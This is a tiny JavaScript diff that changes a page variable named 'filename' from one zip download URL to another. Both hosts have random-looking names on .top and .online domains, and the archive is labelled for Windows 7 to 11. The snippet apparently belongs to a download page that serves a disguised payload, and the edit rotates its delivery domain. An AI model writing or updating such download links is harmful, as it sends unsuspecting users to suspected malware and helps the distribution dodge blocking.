@@ -1,3 +1,3 @@
 (function() {
-    window['filename'] = 'https://s3trrreow-s3-oss.top/win7-11%20letsevpsjdtn.zip';
+    window['filename'] = 'https://reowasiu-s3oss.online/win7-11%20letsevpsjdtn.zip';
 })();
